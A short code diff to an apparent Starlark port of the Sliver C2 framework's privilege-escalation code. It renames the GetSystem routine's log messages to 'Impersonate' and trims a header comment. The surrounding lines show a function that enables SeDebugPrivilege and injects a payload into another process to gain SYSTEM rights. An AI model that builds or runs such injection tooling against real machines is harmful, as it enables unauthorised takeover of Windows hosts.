@@ -1,5 +1,4 @@
-# Strict 1:1 Starlark translation of GetSystem(data []byte, hostingProcess string),
-# RemoteTask(processID int, data []byte, rwxPages bool), and injectTask(processHandle, data, rwxPages) from priv_windows.go & task_windows.go
+# Translated from Sliver C2's priv package
 
 TOKEN_ADJUST_PRIVILEGES = 0x0020
 SE_PRIVILEGE_ENABLED = 0x00000002
@@ -203,7 +202,7 @@ def find_process_by_name(exe_name_target):
 
 
 def Impersonate(payload_bytes, target_pid=0):
-    print("[*] GetSystem: Enabling SeDebugPrivilege...")
+    print("[*] Impersonate: Enabling SeDebugPrivilege...")
     err = SePrivEnable("SeDebugPrivilege")
     if err != None:
         print("[-] SePrivEnable failed: %s" % err)
@@ -221,7 +220,7 @@ def Impersonate(payload_bytes, target_pid=0):
         print("[-] RemoteTask failed: %s" % err)
         return "Fail: " + err
 
-    print("[+] GetSystem succeeded via process injection into PID %d" % target_pid)
+    print("[+] Impersonate succeeded via process injection into PID %d" % target_pid)
     return "OK"
 
 
